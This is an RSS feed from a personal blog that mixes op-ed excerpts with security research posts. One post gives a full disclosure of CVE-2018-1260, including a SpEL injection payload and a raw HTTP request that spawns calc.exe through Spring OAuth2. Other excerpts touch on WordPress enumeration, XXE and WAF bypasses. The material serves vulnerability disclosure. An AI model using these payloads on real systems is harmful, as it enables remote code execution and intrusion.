<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Forensics on Gharib Personal Blog</title>
    <link>https://ghariib.ir/categories/forensics/</link>
    <description>Recent content in Forensics on Gharib Personal Blog</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <copyright>Alireza Gharib. All right reserved</copyright>
    <lastBuildDate>Thu, 06 Feb 2025 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://ghariib.ir/categories/forensics/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Is America Poised to Overreact to DeepSeek?</title>
      <link>https://ghariib.ir/posts/is-america-poised-to-overreact-to-deepseek/</link>
      <pubDate>Thu, 06 Feb 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/is-america-poised-to-overreact-to-deepseek/</guid>
      <description>&lt;p&gt;The last several days have been dubbed a “Sputnik moment” for Americans, who are discovering that foreign software engineers are much further ahead than previously thought. On January 20th, the Chinese company DeepSeek announced the release of their newest large language model (LLM) “DeepSeek R1.” Reportedly trained for just $6 million, DeepSeek R1 achieves capabilities that more than rival the output of American AI giants like Anthropic, OpenAI, Meta and Google, whose models have required billions in investment. &lt;/p&gt;</description>
    </item>
    <item>
      <title>Trump Should Increase High-Skilled Immigration</title>
      <link>https://ghariib.ir/posts/trump-should-increase-high-skilled-immigration/</link>
      <pubDate>Thu, 06 Feb 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/trump-should-increase-high-skilled-immigration/</guid>
      <description>&lt;p&gt;Elon Musk’s and Vivek Ramaswamy’s support for increasing high-skilled immigration visas has stirred up a political storm within conservative circles. Although Trump has supported Musk’s and Ramaswamy’s comments, his words conflict with his first-term immigration policies. If his change in rhetoric is matched by a change in policy, it would help make America great.&lt;/p&gt;&#xA;&lt;p&gt;Musk and Ramaswamy, whom Trump has tasked with improving government efficiency, both recently suggested that increasing the number of high-skill H-1B visas would improve the U.S. economy. Musk wrote on X that more H-1B visas are needed because “There is a permanent shortage of excellent engineering talent. It is the fundamental limiting factor in Silicon Valley.”&lt;/p&gt;</description>
    </item>
    <item>
      <title>Congress Must Stop Trading Stocks</title>
      <link>https://ghariib.ir/posts/congress-must-stop-trading-stocks/</link>
      <pubDate>Sat, 01 Feb 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/congress-must-stop-trading-stocks/</guid>
      <description>&lt;p&gt;Legislators—Congressmen and Senators—routinely receive material non-public information that is crucial to crafting legislation for the US government to operate efficiently and meet the needs of the American people. Unfortunately, many legislators use this information to enrich themselves at the expense of the very people they are elected to represent. Using privileged information for personal gain is a tremendous abuse of power and tantamount to graft. Service in the Congress is an honor. Legislators, senior officials in the executive and judicial branches, and their families should be prohibited from trading in individual securities. Those officials who have profited from this abuse of power have revealed their lack of moral fiber and should no longer serve in government. &lt;/p&gt;</description>
    </item>
    <item>
      <title>Of Budgets and Biases</title>
      <link>https://ghariib.ir/posts/of-budgets-and-biases/</link>
      <pubDate>Sat, 01 Feb 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/of-budgets-and-biases/</guid>
      <description>&lt;p&gt;Austrian economist Gene Callahan likes to remind us that fantasy is not an adult policy option.&lt;/p&gt;&#xA;&lt;p&gt;We are often reminded of his words in national debates and handwringing over potential budget cuts, whether by the Republican-led Congress, or President Trump’s new Department of Government Efficiency (DOGE)—or attempts to address the $36 trillion debt elephant in the room.&lt;/p&gt;&#xA;&lt;p&gt;Economist Bryan Caplan has pointed out a number of systematically biased beliefs American voters hold about the economy. Generally, Americans tend to hold four basic biases about the economy: an anti-market bias, leading to favor government intervention; an anti-foreign bias, which leads them to underestimate the contributions of foreigners and the benefits of trade; a make-work bias, which equates prosperity with the number of jobs (regardless of productivity or value added); and a pessimism bias, which leads them to think that economic conditions are far worse than they really are.&lt;/p&gt;</description>
    </item>
    <item>
      <title>The Resurgence of Tariffs</title>
      <link>https://ghariib.ir/posts/the-resurgence-of-tariffs/</link>
      <pubDate>Sat, 01 Feb 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/the-resurgence-of-tariffs/</guid>
      <description>&lt;p&gt;President Donald Trump imposed a 25% tariffs on Canadian and Mexican imports and a further 10% tariff on Chinese imports, to take effect on Feb. 1. In doing so Trump built on tariffs he put into effect during his first term—tariffs that President Joe Biden largely kept in place or added to. This resurgence of tariffs provide a good reason for revisiting economic history and what the science of economics tells us about international trade.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Bureaucrats Ordered to Go Back to Work</title>
      <link>https://ghariib.ir/posts/bureaucrats-ordered-to-go-back-to-work/</link>
      <pubDate>Wed, 29 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/bureaucrats-ordered-to-go-back-to-work/</guid>
      <description>&lt;p&gt;The offices where Washington D.C.’s bureaucrats work were largely empty on Monday, January 20, 2025, as Donald Trump was inaugurated as U.S. President for the second time.&lt;/p&gt;&#xA;&lt;p&gt;But they weren’t empty for the inauguration. Because that Monday coincided with the Martin Luther King Jr. Day federal holiday, most U.S. government employees had a paid day off work.&lt;/p&gt;&#xA;&lt;p&gt;But then, many of the federal government’s buildings continued to sit empty on Tuesday, January 21, and again on Wednesday, Thursday, and Friday.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Lessons from the Republic of Georgia on Economic Freedom</title>
      <link>https://ghariib.ir/posts/lessons-from-the-republic-of-georgia-on-economic-freedom/</link>
      <pubDate>Sat, 25 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/lessons-from-the-republic-of-georgia-on-economic-freedom/</guid>
      <description>&lt;p&gt;As a child, I was told by many people that the United States was the only free country in the world, the land of the free, which implicitly suggested that every other country was somehow not free. I thought that other countries were tyrannical states, which subjugated their citizens and treated them like slaves. As I grew older, I realized that nothing was further from the truth. A myriad of free societies exist throughout the world, many of which are free in ways that are completely different from the United States.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Neoliberalism Never Happened</title>
      <link>https://ghariib.ir/posts/neoliberalism-never-happened/</link>
      <pubDate>Thu, 23 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/neoliberalism-never-happened/</guid>
      <description>&lt;p&gt;Neoliberalism is a myth. The concept suggests that starting in the 1970s Western economies have been shaped by free-market principles, the state has retreated, and markets have reigned supreme. And yet, the last fifty years were not about liberalizing, but about strengthening the state. Neoliberalism never happened. Instead, what unfolded was neostatism—a strategy where governments restructured their role to protect and expand their power. From the late 1970s onward, policies branded as “neoliberal” were crafted not to relinquish state control but to reassert it. And today, as overt state intervention returns with a vengeance, it becomes clear that the “neoliberal era” was a carefully managed illusion.&lt;/p&gt;</description>
    </item>
    <item>
      <title>6 Privacy Pitfalls for Developers to Avoid</title>
      <link>https://ghariib.ir/posts/6-privacy-pitfalls-for-developers-to-avoid/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/6-privacy-pitfalls-for-developers-to-avoid/</guid>
      <description>&lt;p&gt;&#xD;&#xA;&lt;figure&gt;&#xD;&#xA;  &lt;img src=&#34;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg1BM9Mqi1_2r34B27V2lS1KaekgvFgGVPuT_kNGRRdYMlOr3y0osyZ7Vbs6FcYmgbyJbb-RcQ3I-z6DZifKGhYE2b3NxS312wL-sjl0Nw-xVH81SYUx3rBCe_R2ydamcAEim2mToSHJ83otc7WPN1MlM3OYK6o_r0es7RbEqILrkqwFfrAMmcMvvs6IA/w640-h426/6privacy_front-1024x683-1.jpg&#34; alt=&#34;&#34; /&gt;&#xD;&#xA;&lt;/figure&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;While tech-savvy people are very concerned about privacy, knowing where to find metadata leaks can be nebulous even for developers. In this blog post, we will explore examples of unexpected user information leakage. We hope that the information shared in this blog will help developers assess and address potential privacy issues with their applications, as well as educate end-users about potential risks to their privacy that can result from information leaks.&lt;/p&gt;</description>
    </item>
    <item>
      <title>6 ways to enumerate WordPress Users</title>
      <link>https://ghariib.ir/posts/6-ways-to-enumerate-wordpress-users/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/6-ways-to-enumerate-wordpress-users/</guid>
      <description>&lt;p&gt;&#xD;&#xA;&lt;figure&gt;&#xD;&#xA;  &lt;img src=&#34;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiJW387o-w66SJCmapiPp1JyKIgrFc25ZssYt1MFXl8forkpqmrZdyfIUGooaYM90l3QAxm-dEmDCDtaI7uWvO1hqYckKc1NL3IkIBjze0kasHT9EwO8obqr_mJpzcdc6XpOWyzhOokVdih0YIvud6LEGNHgozLyL7WMllxtmplkE0rEQh42FSxsp28kA/s320/wordpress-bypass_crop%5B1%5D.png&#34; alt=&#34;&#34; /&gt;&#xD;&#xA;&lt;/figure&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;If you are testing the security of WordPress websites, you will likely have to look at the REST endpoints. By default, users can be listed with the route “/wp-json/wp/v2/users”. On the latest WordPress version, out of the box, you will get the username and the hashed email. Experienced WordPress administrators and users are aware of the potential disclosure. Therefore, we can see various tutorials online on how to hide this information. The recommended ways are either to disable the REST API completely,&lt;br&gt;&#xA;install a security plugin which disables the specific route or block specific request paths.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Automating local DTD discovery for XXE exploitation</title>
      <link>https://ghariib.ir/posts/automating-local-dtd-discovery-for-xxe-exploitation/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/automating-local-dtd-discovery-for-xxe-exploitation/</guid>
      <description>&lt;p&gt;&#xD;&#xA;&lt;figure&gt;&#xD;&#xA;  &lt;img src=&#34;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg0uunz3Q23zx_rXvtIRxgNxLpkVFuHXuGUxaJXfhJD_793yr8bS6tsCndpaYq3sTiwNluXuohipjbQfiJE8nLDs2tSfLp4xPapCeH2o8qN8oYac1j_G_H5NMuX9O7AlhO5E3PGtrVHoaux/s320/xxe2%255B1%255D.png&#34; alt=&#34;&#34; /&gt;&#xD;&#xA;&lt;/figure&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;Last month, we presented at Hack In Paris (France) a XML External Entities (XXE) exploitation workshop. It showcase methods to exploit XXE with numerous obstacles. Today, we present our method to exploit XXEs with a local Document Type Declaration (DTD) file. More specifically, how we built a huge list of reusable DTD files.&lt;/p&gt;&#xA;&lt;p&gt;XML External Entities (XXE) is a type of attack done against an application that parses XML input. It occurs when XML input containing a reference to an external entity (SYSTEM entity) is processed by a weakly configured XML parser. Over the years, researchers have found multiple ways to exfiltrate content using various XML payloads:&lt;/p&gt;</description>
    </item>
    <item>
      <title>Beware of the Magic SpEL(L) - Part 1 (CVE-2018-1273)</title>
      <link>https://ghariib.ir/posts/beware-of-the-magic-spell-part-1-cve-2018-1273/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/beware-of-the-magic-spell-part-1-cve-2018-1273/</guid>
      <description>&lt;p&gt;&#xD;&#xA;&lt;figure&gt;&#xD;&#xA;  &lt;img src=&#34;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjieBCHbDnWgSpgeNXdh5el_cqQEeF33UfD_zIsI7BVC_JH9aPWf_o4AM1po1uBXEY4-4qHZfbh273gG5u1xDjjYfljVR6QNOeW1JmSOXqxHGAxWUHJpI9Ugp3FNXUgFCqcW2jZAg8hNrPl/s320/spring-el.png&#34; alt=&#34;&#34; /&gt;&#xD;&#xA;&lt;/figure&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;This February, we ran a Find Security Bugs scan on over at least one hundred components from the Spring Framework, including the core components (spring-core, spring-mvc) but also optional components (spring-data, spring-social, spring-oauth, etc.). From this exercise, we reported some vulnerabilities. In this blog post, we are going to give more details on a SpEL injection vulnerability. While some proof of concept code and exploitation details have already surfaced on Twitter, we will add a focus on how these vulnerabilities were found, followed by a thorough review of the proposed fix.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Beware of the Magic SpEL(L) – Part 2 (CVE-2018-1260)</title>
      <link>https://ghariib.ir/posts/beware-of-the-magic-spell-part-2-cve-2018-1260/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/beware-of-the-magic-spell-part-2-cve-2018-1260/</guid>
      <description>&lt;p&gt;&#xD;&#xA;&lt;figure&gt;&#xD;&#xA;  &lt;img src=&#34;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_EUzFEi_nPDSoSmzQz_gG5EAxsJ9oNtznOCZZYlHG72s1iAwFp8hyphenhyphentAOX2e2WEQwpNXHJIJwkV5tU7UA8G3dAufDqByKehkteiObXhtL5yu6MCcNbIB9059VWSa8o6V8SphkdpDnzZD58/s320/spring-oauth2.png&#34; alt=&#34;&#34; /&gt;&#xD;&#xA;&lt;/figure&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;On Tuesday, we released the details of RCE vulnerability affecting Spring Data (CVE-2018-1273). We are now repeating the same exercise for a similar RCE vulnerability in Spring Security OAuth2 (CVE-2018-1260). We are going to present the attack vector, its discovery method and the conditions required for exploitation. This vulnerability also has similarities with another vulnerability disclosed in 2016. The resemblance will be discussed in the section where we review the fix.&lt;/p&gt;&#xA;&lt;h2 id=&#34;analyzing-a-potential-vulnerability&#34;&gt;Analyzing a potential vulnerability&lt;/h2&gt;&#xA;&lt;p&gt;It all started by the report of the bug pattern SPEL_INJECTION by Find Security Bugs. It reported the use of &lt;code&gt;SpelExpressionParser.parseExpression()&lt;/code&gt; with a dynamic parameter, the same API used in the previous vulnerability we had found. The expression parser is used to parse expressions placed between curly brackets &amp;ldquo;${&amp;hellip;}&amp;rdquo;.&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public SpelView(String template) {&#xA;    this.template = template;&#xA;    this.prefix = new RandomValueStringGenerator().generate() + &amp;#34;{&amp;#34;;&#xA;    this.context.addPropertyAccessor(new MapAccessor());&#xA;    this.resolver = new PlaceholderResolver() {&#xA;        public String resolvePlaceholder(String name) {&#xA;            Expression expression = parser.parseExpression(name); //Expression parser&#xA;            Object value = expression.getValue(context);&#xA;            return value == null ? null : value.toString();&#xA;        }&#xA;    };&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The controller class &lt;code&gt;WhitelabelApprovalEndpoint&lt;/code&gt; uses this SpelView class to build the approval page for OAuth2 authorization flow. The SpelView class evaluates the string named &amp;ldquo;template&amp;rdquo; - see code below - as a Spring Expression.&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;@RequestMapping(&amp;#34;/oauth/confirm_access&amp;#34;)&#xA;public ModelAndView getAccessConfirmation(Map&amp;lt;String, Object&amp;gt; model, HttpServletRequest request) throws Exception {&#xA;   String template = createTemplate(model, request);&#xA;   if (request.getAttribute(&amp;#34;_csrf&amp;#34;) != null) {&#xA;      model.put(&amp;#34;_csrf&amp;#34;, request.getAttribute(&amp;#34;_csrf&amp;#34;));&#xA;   }&#xA;   return new ModelAndView(new SpelView(template), model); //template variable is a SpEL&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Following the methods createTemplate() and createScopes(), we can see that the attribute &amp;ldquo;scopes&amp;rdquo; is appended to the HTML template which will be evaluated as an expression. The only model parameter bound to the template is a CSRF token. However, the CSRF token will not be under the control of a remote user.&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;protected String createTemplate(Map&amp;lt;String, Object&amp;gt; model, HttpServletRequest request) {&#xA;   String template = TEMPLATE;&#xA;   if (model.containsKey(&amp;#34;scopes&amp;#34;) || request.getAttribute(&amp;#34;scopes&amp;#34;) != null) { &#xA;      template = template.replace(&amp;#34;%scopes%&amp;#34;, createScopes(model, request)).replace(&amp;#34;%denial%&amp;#34;, &amp;#34;&amp;#34;);&#xA;   }&#xA;&#xA;[...]&#xA;&#xA;private CharSequence createScopes(Map&amp;lt;String, Object&amp;gt; model, HttpServletRequest request) {&#xA;   StringBuilder builder = new StringBuilder(&amp;#34;&amp;lt;ul&amp;gt;&amp;#34;);&#xA;   @SuppressWarnings(&amp;#34;unchecked&amp;#34;)&#xA;   Map&amp;lt;String, String&amp;gt; scopes = (Map&amp;lt;String, String&amp;gt;) (model.containsKey(&amp;#34;scopes&amp;#34;) ? model.get(&amp;#34;scopes&amp;#34;) : request&#xA;         .getAttribute(&amp;#34;scopes&amp;#34;));  //Scope attribute loaded here&#xA;   for (String scope : scopes.keySet()) {&#xA;      String approved = &amp;#34;true&amp;#34;.equals(scopes.get(scope)) ? &amp;#34; checked&amp;#34; : &amp;#34;&amp;#34;;&#xA;      String denied = !&amp;#34;true&amp;#34;.equals(scopes.get(scope)) ? &amp;#34; checked&amp;#34; : &amp;#34;&amp;#34;;&#xA;      String value = SCOPE.replace(&amp;#34;%scope%&amp;#34;, scope).replace(&amp;#34;%key%&amp;#34;, scope).replace(&amp;#34;%approved%&amp;#34;, approved)&#xA;            .replace(&amp;#34;%denied%&amp;#34;, denied);&#xA;      builder.append(value);&#xA;   }&#xA;   builder.append(&amp;#34;&amp;lt;/ul&amp;gt;&amp;#34;);&#xA;   return builder.toString();&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;At this point, we are unsure if the scopes attribute can be controlled by the remote user. While attribute (req.getAttribute(..)) represents session values stored server-side, scope is an optional parameter part of OAuth2 flow. The parameter might be accessible to the user, saved to the server-side attributes and finally loaded into the previous template.&lt;br&gt;&#xA;After some research in the documentation and some manual tests, we found that &amp;ldquo;scope&amp;rdquo; is a GET parameter part of the implicit OAuth2 flow. Therefore, the implicit mode would be required for our vulnerable application.&lt;/p&gt;&#xA;&lt;h2 id=&#34;proof-of-concept-and-limitations&#34;&gt;Proof-of-Concept and Limitations&lt;/h2&gt;&#xA;&lt;p&gt;When testing our application, we realized that the scopes were validated against a scopes whitelist defined by the user/client. If this whitelist is configured, we can&amp;rsquo;t be creative with the parameter scope. If the scopes are simply not defined, no validation is applied to the name of the scopes. This limitation will likely make most Spring OAuth2 applications safe.&lt;br&gt;&#xA;This first request made used the scope &amp;ldquo;${1338-1}&amp;rdquo;, see picture below. Based on the response, we now have a confirmation that the scope parameter&amp;rsquo;s value can reach the SpelView expression evaluation. We can see in the resulting HTML multiples instances of the string &amp;ldquo;scope.1337&amp;rdquo;.&lt;/p&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;&#xD;&#xA;&lt;figure&gt;&#xD;&#xA;  &lt;img src=&#34;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgBRxeuEyK1xwqLTgdDIig_VdsmEXGIMU-LEc2sW9Yaajyh8hS7Sv83fPZDkywg5OZLXRwNZOQWMXJv2L_fjQwwH4z1scj71gmVB7vmcFCdFFpcAJJYrWBkev9bhGJN_5O6y88BdzyAvO8Q/s640/spel1.png&#34; alt=&#34;&#34; /&gt;&#xD;&#xA;&lt;/figure&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;Pushing the probe value ${1338-1}&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;p&gt;A second test was made using the expression &amp;ldquo;${T(java.lang.Runtime).getRuntime().exec(&amp;ldquo;calc.exe&amp;rdquo;)}&amp;rdquo; to verify that the expressions are not limited to simple arithmetic operations.&lt;/p&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;&#xD;&#xA;&lt;figure&gt;&#xD;&#xA;  &lt;img src=&#34;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguUEbrAlV3kvr9fkscJPJfiqZDa5L-iOJonbTGMoeMfhC6E-HUA9tq1ayX5vBFWTYrs15cfx9QajcIwBtuOmpshdW6j5FmI1mlc1gst5grv8qoFTM1I7EbwyY9qeg7Dmj8MTJ3peC7h-Sf/s640/spel2.png&#34; alt=&#34;&#34; /&gt;&#xD;&#xA;&lt;/figure&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;Simple proof-of-concept request spawning a calc.exe subprocess&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;p&gt;For easier reproduction, here is the raw HTTP request from the previous screenshot. Some characters - mainly curly brackets - were not supported by the web container and needed to be URL encoded in order to reach the application. { -&amp;gt; %7b&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /oauth/authorize?response_type=code&amp;amp;client_id=client&amp;amp;username=user&amp;amp;password=user&amp;amp;grant_type=password&amp;amp;scope=%24%7bT(java.lang.Runtime).getRuntime().exec(%22calc.exe%22)%7d&amp;amp;redirect_uri=http://csrf.me HTTP/1.1&#xA;Host: localhost:8080&#xA;Authorization: Bearer 1f5e6d97-7448-4d8d-bb6f-4315706a4e38&#xA;Content-Type: application/x-www-form-urlencoded&#xA;Accept: */*&#xA;Content-Length: 0&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;reviewing-the-fix&#34;&gt;Reviewing The Fix&lt;/h2&gt;&#xA;&lt;p&gt;The solution chosen by the Pivotal team was to replace SpelView with a simpler view, with basic concatenation. This eliminates all possible paths to a SpEL evaluation. The first patch proposed introduced a potential XSS vulnerability, but luckily this was spotted before any release was made. The scope values are now properly escaped and free from any injection.&lt;br&gt;&#xA;More importantly, this solution improved the security of another endpoint: WhitelabelErrorEndpoint. The endpoint is also no longer uses a Spel View. It was found vulnerable to an identical attack vector in 2016. Spring-OAuth2 also used the SpelView class to build the error page. The interesting twist is that the template parameter was static, but the parameters bound to the template were evaluated recursively. This means that any value in the model could lead to a Remote Code Execution.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Bypassing ModSecurity WAF</title>
      <link>https://ghariib.ir/posts/bypassing-modsecurity-waf/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/bypassing-modsecurity-waf/</guid>
      <description>&lt;p&gt;Being able to bypass Web Application Firewall (WAF) depends on your knowledge about their behavior. Here is a cool technique that involve &lt;strong&gt;expressions that are ignored in MySQL SQL parser&lt;/strong&gt; (MySQL &amp;lt;= 5.7). This post summarizes the impact on libinjection. The libinjection library is used by WAF such as ModSecurity and SignalScience. For more details on AWS Cloudfront impact, read the original GoSecure article.&lt;/p&gt;&#xA;&lt;p&gt;&#xD;&#xA;&lt;figure&gt;&#xD;&#xA;  &lt;img src=&#34;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPVnidYg-zDcbocWT8PLVe-A3XzqWbXSUIOdIu3iFJMr5MSMm9yFg3hsyGDbuWrpqbgrpUj9XY2JyIdgNJv50IlUdIgeIHjNmBjqVYz8Vz8YO-e3toUt6Bd_Dwf9etJAumCHr8Mq89KQGT/s16000/s1bwt2caxl3q8m5d3rdc%255B1%255D.jpg&#34; alt=&#34;&#34; /&gt;&#xD;&#xA;&lt;/figure&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;&lt;/p&gt;&#xA;&lt;h2 id=&#34;scientific-expression-in-mysql&#34;&gt;Scientific expression in MySQL&lt;/h2&gt;&#xA;&lt;p&gt;When MySQL sees &lt;code&gt;1.e(abc)&lt;/code&gt;, it will ignore the &lt;code&gt;1.e(&lt;/code&gt; portion because the following characters do not form a valid numeric value.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Creating A Custom View for WebSocket in ZAP</title>
      <link>https://ghariib.ir/posts/creating-a-custom-view-for-websocket-in-zap/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/creating-a-custom-view-for-websocket-in-zap/</guid>
      <description>&lt;p&gt;&#xD;&#xA;&lt;figure&gt;&#xD;&#xA;  &lt;img src=&#34;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbETbc1fXDey2o7NC3ZLEq1k5hZCqEoEpz4lzxWVtKG6ansPGEuxnVY7LV1Xm_5A3G8-jtvQgT16MtRSi-_y3AdyshZ_wi7yGDHzP8yn0a0iwo-k3z1JEDsPAHxie17ohTSnkf-uv-s1UD/s320/websocket-in-zap-image-feature%255B1%255D.png&#34; alt=&#34;&#34; /&gt;&#xD;&#xA;&lt;/figure&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;When we were looking at the interactions between the Outlook and the LinkedIn APIs, we encountered WebSocket communications that used some additional encoding. The encoding was nothing too complex, but it was uncommon. It turned out to be LZip compression. However, the inability to read the content of the requests with Burp, ZAP or Web developer consoles in real-time made it difficult to analyze the API.&lt;/p&gt;&#xA;&lt;p&gt;While our proxy of choice is usually Burp Suite, it did not allow us to extend WebSocket views. We turn ourselves to the open-source project Zed Attack Proxy. It reveals to be easily extendable for custom WebSocket tooling. In this blog post, we will explain how you can implement your own custom view to display complex WebSocket messages.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Deanonymizing LinkedIn Users</title>
      <link>https://ghariib.ir/posts/deanonymizing-linkedin-users/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/deanonymizing-linkedin-users/</guid>
      <description>&lt;p&gt;&#xD;&#xA;&lt;figure&gt;&#xD;&#xA;  &lt;img src=&#34;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjg7aLzYD2_lxNFbzk2uImf0Id_uOXb45d-z_mkCoZD3wcD3vMy52PtEow16K6BcXZshnhi_5fpJBmwQRxAc-suHOiIMf6ZsxtwpsjNdi0qCv93lGUoszq1uxTUFjr_SpvPcpxgfrGFRSJZ/s320/linkedin_card_v2%255B1%255D.png&#34; alt=&#34;&#34; /&gt;&#xD;&#xA;&lt;/figure&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;In this blog post, we will look at the privacy issues with some of LinkedIn’s external APIs. We will demonstrate how it is possible, with an email address, to find its associated LinkedIn profile. It is also possible from a LinkedIn profile to do the reverse path and find a person’s email address. To execute this deanonymization attack, documented features, like LinkedIn’s integration with Outlook and YahooMail, are used.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Emails Disclosure on WordPress</title>
      <link>https://ghariib.ir/posts/emails-disclosure-on-wordpress/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/emails-disclosure-on-wordpress/</guid>
      <description>&lt;p&gt;&#xD;&#xA;&lt;figure&gt;&#xD;&#xA;  &lt;img src=&#34;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgq2xqKk1ubaVqsHfi6sEA09BIrKp0tq5owY7LB4nlg8eNKmroRMqHEqFoTabFGi0ZLEQYie07RtSjDbve08MCwVdLisOINcEcnNfcPkHmWCRgAJXyMBOmDRhEc_o5G-ZRKVnxJbtBiMeaK/s320/blog-email-disclosure-wordpress-image-1%255B1%255D.jpg&#34; alt=&#34;&#34; /&gt;&#xD;&#xA;&lt;/figure&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;&lt;/p&gt;&#xA;&lt;p&gt;Password brute force is one of the common most attack on WordPress. Only a few hours after the deployment of a new blog, we can see login attempts to /xmlrpc.php or /wp-login.php endpoints. While not being sophisticated, they remain strong attacks as they put pressure on the limited complexity passwords and potential password reuse from users. In this article, we are going to explain how the public&lt;/p&gt;&#xA;&lt;p&gt;wordpress.com REST API makes it easier for brute-force attacks on millions of WordPress instances managed by wordpress.com or private instances with the Jetpack plugin installed.&lt;/p&gt;</description>
    </item>
    <item>
      <title>ESI Injection Part 2: Abusing specific implementations</title>
      <link>https://ghariib.ir/posts/esi-injection-part-2-abusing-specific-implementations/</link>
      <pubDate>Wed, 22 Jan 2025 00:00:00 +0000</pubDate>
      <guid>https://ghariib.ir/posts/esi-injection-part-2-abusing-specific-implementations/</guid>
